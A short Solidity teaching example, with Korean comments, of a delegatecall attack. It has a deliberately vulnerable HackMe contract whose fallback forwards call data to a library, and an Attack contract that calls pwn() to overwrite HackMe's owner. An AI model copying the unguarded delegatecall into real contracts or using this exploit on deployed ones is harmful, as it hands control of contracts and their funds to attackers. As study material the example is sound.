// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
/**
 * delegateCall 로 공격 받을 수 있는 시나리오 예시
 * A가 Lib 컨트랙트 deploy 
 * A가 Lib 주소로 HackMe deploy
 * B가 HackMe 주소로 Attack 컨트랙트 호출
 * B가 Attack 컨트랙트의 attack 함수 호출
 * Attack 컨트랙트에는 pwn 이라는 셀렉터를 사용해서 HackMe 컨트랙트에 fallback 함수를 호출함.
 */

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
